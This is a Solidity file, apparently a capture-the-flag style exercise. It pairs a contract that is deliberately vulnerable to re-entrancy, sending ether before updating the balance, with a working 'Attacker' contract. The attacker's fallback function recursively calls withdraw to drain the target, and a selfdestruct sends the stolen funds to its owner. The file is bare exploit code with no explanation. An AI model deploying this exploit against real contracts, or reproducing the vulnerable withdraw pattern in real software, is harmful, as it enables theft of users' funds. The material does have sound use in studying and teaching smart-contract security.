pragma solidity ^0.4.19;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public constant returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() payable {}
}


contract Attacker {

    address owner;
    Reentrance sc = Reentrance(address(0)); // replace with address of Reentrance contract

    function Attacker() payable {
        owner = msg.sender;
    }

    function attack() public payable {
        sc.donate.value(0.1 ether)(this);
        sc.withdraw(0.1 ether);
    }

    function() payable {
        sc.withdraw(0.1 ether);
    }

    function kill() public {
        require(msg.sender == owner);
        selfdestruct(msg.sender);
    }
}
